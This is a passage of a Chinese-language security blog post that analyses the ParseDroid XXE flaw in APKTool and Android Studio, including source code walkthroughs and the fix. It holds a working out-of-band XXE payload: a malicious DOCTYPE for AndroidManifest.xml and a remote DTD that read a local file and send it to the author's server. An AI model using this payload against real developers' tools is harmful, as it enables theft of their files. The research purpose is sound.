        outFile = new File(cli.getOptionValue(&quot;o&quot;));
    } else {
        outFile = null;
    }

    // try and build apk
    new Androlib(apkOptions).build(new File(appDirName), outFile);
}
</code></pre><p>在处理完其余的参数后，调用<code>new Androlib().build()</code>进行回编译，以下跳过其它编译部分</p>
<p>创建一个<code>AndroidManifest.xml.orig</code>文件用于备份<code>AndroidManifest.xml</code></p>
<pre><code>new File(appDir, APK_DIRNAME).mkdirs();
File manifest = new File(appDir, &quot;AndroidManifest.xml&quot;);
File manifestOriginal = new File(appDir, &quot;AndroidManifest.xml.orig&quot;);
</code></pre><p>调用<code>buildManifestFile()</code>进行解析</p>
<pre><code>buildManifestFile(appDir, manifest, manifestOriginal);
</code></pre><p>使用<code>FileUtils.copyFile()</code>函数拷贝<code>AndroidManifest.xml</code>到<code>AndroidManifest.xml.orig</code></p>
<pre><code>private void buildManifestFile(File appDir, File manifest, File manifestOriginal)
        throws AndrolibException {

    // If we decoded in &quot;raw&quot;, we cannot patch AndroidManifest
    if (new File(appDir, &quot;resources.arsc&quot;).exists()) {
        return;
    }
    if (manifest.isFile() &amp;&amp; manifest.exists()) {
        try {
            if (manifestOriginal.exists()) {
                manifestOriginal.delete();
            }
            FileUtils.copyFile(manifest, manifestOriginal);
            ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest);
        } catch (IOException ex) {
            throw new AndrolibException(ex.getMessage());
        }
    }
}
</code></pre><p>拷贝完成后调用<code>ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest)</code>进行解析</p>
<pre><code>public static void fixingPublicAttrsInProviderAttributes(File file) throws AndrolibException {
    boolean saved = false;
    if (file.exists()) {
        try {
            Document doc = loadDocument(file);
            XPath xPath = XPathFactory.newInstance().newXPath();
            XPathExpression expression = xPath.compile(&quot;/manifest/application/provider&quot;);

            Object result = expression.evaluate(doc, XPathConstants.NODESET);
            NodeList nodes = (NodeList) result;

            for (int i = 0; i &lt; nodes.getLength(); i++) {
                Node node = nodes.item(i);
                NamedNodeMap attrs = node.getAttributes();

                if (attrs != null) {
                    Node provider = attrs.getNamedItem(&quot;android:authorities&quot;);

                    if (provider != null) {
                        saved = isSaved(file, saved, provider);
                    }
                }
            }

            // android:scheme
            xPath = XPathFactory.newInstance().newXPath();
            expression = xPath.compile(&quot;/manifest/application/activity/intent-filter/data&quot;);

            result = expression.evaluate(doc, XPathConstants.NODESET);
            nodes = (NodeList) result;

            for (int i = 0; i &lt; nodes.getLength(); i++) {
                Node node = nodes.item(i);
                NamedNodeMap attrs = node.getAttributes();

                if (attrs != null) {
                    Node provider = attrs.getNamedItem(&quot;android:scheme&quot;);

                    if (provider != null) {
                        saved = isSaved(file, saved, provider);
                    }
                }
            }

            if (saved) {
                saveDocument(file, doc);
            }

        }  catch (SAXException | ParserConfigurationException | IOException |
                XPathExpressionException | TransformerException ignored) {
        }
    }
}
</code></pre><p>这个方法比较复杂，第一句是进行文件的加载</p>
<pre><code>Document doc = loadDocument(file);
</code></pre><p>这个函数我们之前在对比修复补丁的时候看过，但是作者在那之后又进行了多次的修改，所以代码看起来会相对不一样，但是核心的代码还是可以看出来的，因为一开始没有禁用外部实体引用，直接调用了<code>parse()</code>，导致的XXE</p>
<pre><code>private static Document loadDocument(File file)
            throws IOException, SAXException, ParserConfigurationException {

    DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
    docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
    docFactory.setFeature(FEATURE_LOAD_DTD, false);

    try {
        docFactory.setAttribute(ACCESS_EXTERNAL_DTD, &quot; &quot;);
        docFactory.setAttribute(ACCESS_EXTERNAL_SCHEMA, &quot; &quot;);
    } catch (IllegalArgumentException ex) {
        LOGGER.warning(&quot;JAXP 1.5 Support is required to validate XML&quot;);
    }

    DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
    // Not using the parse(File) method on purpose, so that we can control when
    // to close it. Somehow parse(File) does not seem to close the file in all cases.
    FileInputStream inputStream = new FileInputStream(file);
    try {
        return docBuilder.parse(inputStream);
    } finally {
        inputStream.close();
    }
}
</code></pre><p>这里可以来简单的手动模拟下过程，我们就单纯的模拟解析的过程</p>
<p>直接加载我们存在攻击代码的<code>AndroidManifest.xml</code>文件</p>
<pre><code>import java.io.File;   
import java.io.FileInputStream;   
import java.io.InputStream;   

import javax.xml.parsers.DocumentBuilder;   
import javax.xml.parsers.DocumentBuilderFactory;   

public class XmlReader {   
    public static void main(String[] args) throws Exception {
        XmlReader reader = new XmlReader();
    }
    public XmlReader() throws Exception {
        DocumentBuilderFactory domfac = DocumentBuilderFactory.newInstance();
        try {
            DocumentBuilder domBuilder = domfac.newDocumentBuilder();
            InputStream is = new FileInputStream(new File(&quot;AndroidManifest.xml&quot;));
            Document doc = domBuilder.parse(is);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
</code></pre><p>跑起来，可以看到<code>parse()</code>的时候执行了我们的攻击代码</p>
<p><img src="Image/3.png" alt=""></p>
<p>那么我们加入禁用外部实体引用的代码</p>
<pre><code>import java.io.File;   
import java.io.FileInputStream;   
import java.io.InputStream;   

import javax.xml.parsers.DocumentBuilder;   
import javax.xml.parsers.DocumentBuilderFactory;   

import org.w3c.dom.Document;    

public class XmlReader {
    public static void main(String[] args) throws Exception {
        XmlReader reader = new XmlReader();
    }
    public XmlReader() throws Exception {
        String FEATURE_DISABLE_DOCTYPE_DECL = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;
        DocumentBuilderFactory domfac = DocumentBuilderFactory.newInstance();
        domfac.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
        try {
            DocumentBuilder domBuilder = domfac.newDocumentBuilder();
            InputStream is = new FileInputStream(new File(&quot;AndroidManifest.xml&quot;));
            Document doc = domBuilder.parse(is);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
</code></pre><p>运行后，会发现被禁用了</p>
<p><img src="Image/4.png" alt=""></p>
<p>既然验证了漏洞的存在，那么我们怎么构造一个Poc样本呢？</p>
<p>因为前面我们是自己手动添加的那段代码，并没有人会在反编译完APK之后手动加一段攻击自己的代码</p>
<p>所以，我们来研究一下</p>
<p>首先使用Android Studio来直接生成，发现不行，报异常，URL变红选择<code>Ignore</code>忽略掉</p>
<p>然后编译，因为Android Studio版本升级修复了该漏洞，所以我们换到Linux下</p>
<p><img src="Image/5.png" alt=""></p>
<p>此时的攻击场景其实可以分为两种：第一种是被攻击者使用的是存在漏洞的Android Studio，下载了存在攻击代码的项目，直接导入，运行后造成命令执行，第二种是我们生成存在攻击代码的APK，逆向人员反编译后，然后再回编译，触发漏洞</p>
<p>第一种场景在该漏洞发布的那个博客上其实是有提到的，本来想拿那个项目来测试的，发现已删除。所以就自己创建一个，效果一样的</p>
<p>然而新系统并没有环境，用的32位Ubuntu，先装一波Android Studio，挑个稍微早期的版本，保证使用到的编译工具存在漏洞即可</p>
<ul>
<li><a href="http://www.android-studio.org/index.php/download/hisversion">http://www.android-studio.org/index.php/download/hisversion</a></li></ul>
<p>然而也不能太早期了。。。。。。</p>
<p>大概就是2.x左右的版本应该是可以的，看下发布时间，不要是今年的就行，今年发布的可能修复了</p>
<p>毕竟不是教安卓开发，具体的配置就不过多介绍了</p>
<p>创建个项目，然后插入我们前面的代码，一模一样即可</p>
<p>运行起来后，可以看到DNS的解析记录，说明执行了我们在项目里插入的代码</p>
<p>作为一个热爱祖国热爱党的好学生，在下载某些组件的时候遇到了一道墙，所以，本图由李神探提供</p>
<p><img src="Image/6.png" alt=""></p>
<p>那么第二个场景，我们尝试生成一个包含攻击代码的APK，如果一切顺利，逆向人员在反编译后会得到一个含有攻击代码的<code>AndroidManifest.xml</code>，他在回编译的时候，就会触发漏洞</p>
<p>我们来尝试生成，因为那道墙我是真的爬不上去，所以依旧是由李神探来完成以下部分，非常尴尬，编译不了，因为<code>AndroidManifest.xml</code>是由<code>aapt</code>来编译的，所以应该还是aapt的问题</p>
<p><img src="Image/7.png" alt=""></p>
<p>既然使用Android Studio编译不了，那么如果是直接使用APKTool呢？（我觉得效果是一样的，毕竟APKTool用的也是谷歌粑粑的aapt）</p>
<p>反编译，添加代码，回编译，这时候我们得到<code>APKTool_XXE_Poc.apk</code></p>
<p>开启流量监听，使用存在漏洞的APKTool版本反编译</p>
<p>看起来很是尴尬呀，能不能看得懂就看造化了，我们发现我们在回编译的时候是可以触发漏洞的，但是生成的样本却不存在我们插入的代码，在这种情况下，我们如果丢出去一个<code>APKTool_XXE_Poc.apk</code>，它是不会有攻击代码的，也就是说，反编译出来没有攻击代码，回编译时也就触发不了漏洞</p>
<p><img src="Image/8.png" alt=""></p>
<p>喵~喵~喵？</p>
<p>这么尴尬的吗？？？？？？</p>
<p>看起来像是在打包进去的时候被过滤掉了，啥情况？？？？？？</p>
<p>后来仔细想了想：Android Studio和APKTool都使用到了<code>aapt</code>，但是使用前，会先使用<code>DocumentBuilder</code>将其加载为对象，因为未禁用外部实体引用导致的代码执行，在解析了XML文件为实例对象后，再调用<code>aapt</code>进行资源的编译，再结合之前的测试，被过滤掉应该是<code>aapt</code>的操作</p>
<p>这就很尴尬了，这个地方还有待研究，代码太复杂，需要单独写篇文章分析下整个编译过程</p>
<p>弄清楚了这部分后，我们来思考一个问题：如何构造一个具有攻击性的项目？</p>
<p>就像学习二进制漏洞一样，比如一个最简单的栈溢出，最后演示一个EIP变成<code>0x41414141</code>就没了。。。。。。</p>
<p>所以我们这里来实现一下窃取数据并回传服务器，这个在鹅场的文章里有写过类似的，在最后的引用里有提到，感觉写的特别棒，学到了很多</p>
<p>首先使用宿主机模拟服务器，使用PHPStudy来模拟环境</p>
<p>在<code>AndroidManifest.xml</code>中插入下面这段代码，文件自定义，简单插入一句话，不要太独特就好，因为有些字符会造成访问出问题</p>
<pre><code>&lt;!DOCTYPE manifest [
    &lt;!ENTITY % file SYSTEM &quot;file:///home/wnagzihxain/shentanli&quot;&gt;
    &lt;!ENTITY % shentanli SYSTEM &quot;http://192.168.121.1:5555/shentanli.dtd&quot;&gt;
%shentanli;%send;]&gt;
</code></pre><p>我们插入这句话</p>
<pre><code>shentanli_is_safufu
</code></pre><p>因为一开始并不是很懂，所以学习了一波XML的知识</p>
<p>首先是定义了两个<code>ENTITY</code>，然后在后面进行调用，先调用<code>shentanli</code>，后面通过<code>http://</code>协议进行控制，表示访问这个URL，那么访问回来后，我们在服务器存放一个DTD文件，里面的代码和上面的类似，也是一个访问</p>
<pre><code>&lt;!ENTITY % all
&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.121.1:5555/?%file;&#39;&gt;&quot;
&gt;
%all;
</code></pre><p>后面那个<code>%file</code>要结合最上面那个<code>ENTITY</code>来看，我们在最上面访问了<code>shentanli</code>之后，就接着调用了<code>send</code>，而<code>send</code>是在服务器上定义，那么等于再次访问这个URL，只不过后面要先通过<code>file://</code>协议先访问定义的文件，再将访问到的文件数据拼接到URL后面进行访问，那么我们在服务器上就可以看到访问记录</p>
<p>跑起来如下</p>
<p><img src="Image/9.png" alt=""></p>
<p>一开始其实访问的是<code>/etc/passwd</code>，很尴尬的是一直没有出现访问，在李神探的提醒下，发现有些字符是没法利用成功的，需要先使用Base64编码再进行拼接访问</p>
<p>比如我们放一个逗号进去，会看到只请求了服务器的DTD文件后就没有然后了</p>
<p><img src="Image/10.png" alt=""></p>
<p>最后，感谢李神探，我要去哄她睡觉觉了</p>
<h2 id="reference">Reference</h2>
<ul>
<li>ParseDroid: Targeting The Android Development &amp; Research Community：<a href="https://research.checkpoint.com/parsedroid-targeting-android-development-research-community/">https://research.checkpoint.com/parsedroid-targeting-android-development-research-community/</a></li><li>未知攻焉知防——XXE漏洞攻防：<a href="https://security.tencent.com/index.php/blog/msg/69">https://security.tencent.com/index.php/blog/msg/69</a></li><li>Android开发工具Apktool漏洞利用分析：<a href="https://security.tencent.com/index.php/blog/msg/122">https://security.tencent.com/index.php/blog/msg/122</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
